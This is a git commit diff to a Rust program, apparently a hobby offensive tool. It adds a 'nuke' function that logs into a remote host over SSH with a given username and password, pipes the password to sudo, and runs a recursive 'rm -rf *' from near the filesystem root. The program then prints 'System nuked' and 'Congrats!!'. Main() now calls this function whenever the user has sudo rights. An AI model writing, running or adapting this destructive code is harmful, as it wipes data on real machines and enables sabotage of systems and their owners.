98869279b5d4d5009785e953bd939415426a31c4
matiqo1234r <madseries321+github@gmail.com>
2024-06-02 17:10:17 +0200

    Nuke function, now the program is working

--- src/main.rs
+++ src/main.rs
@@ -1,4 +1,5 @@
 use std::process::Command;
+use std::net::TcpStream;
 use dialoguer::Input;
 use std::io::Read;
 use ssh2::Session;
@@ -16,6 +17,23 @@ fn fire(text: &str) -> String {
         }
     }
     faded
+}
+fn nuke(user: &str, host: &str, passwd: &str) {
+    let tcp = TcpStream::connect(format!("{}:22", host)).unwrap();
+    let mut sess = Session::new().unwrap();
+
+    sess.set_tcp_stream(tcp);
+    sess.handshake().unwrap();
+    sess.userauth_password(&user, &passwd).unwrap();
+
+    let mut channel = sess.channel_session().unwrap();
+
+    println!("\x1b[33m( ! )\x1b[0m Nuking the system...");
+    channel.exec(&format!("echo '{}' | sudo -S sh -c 'cd ../.. && rm -rf *'",passwd)).unwrap();
+    println!("\x1b[32m( + )\x1b[0m System nuked");
+    println!("\n\x1b[32m( + )\x1b[0m Congrats!!\n");
+    channel.close().unwrap();
+
 }
 
 fn main() {
@@ -69,13 +87,12 @@ fn main() {
     channel.read_to_string(&mut s).unwrap();
 
     if s.contains("may not run sudo") {
-        println!("\x1b[31m( X )\x1b[0m User does not have sudo permission")
+        println!("\x1b[31m( X )\x1b[0m User does not have sudo permission");
     } else if s.contains("a password is required") {
-        println!("\x1b[33m( ! )\x1b[0m User has sudo permission but a password is required")
+        println!("\x1b[33m( ! )\x1b[0m User has sudo permission but a password is required");
+        nuke(&user, &host, &passwd);
     } else {
-        println!("\x1b[33m( ! )\x1b[0m User has sudo permission without password")
+        println!("\x1b[33m( ! )\x1b[0m User has sudo permission without password");
+        nuke(&user, &host, &passwd);
     }
-
-    channel.close().unwrap();
-    sess.disconnect(None, "Normal Shutdown", None).unwrap();
 }
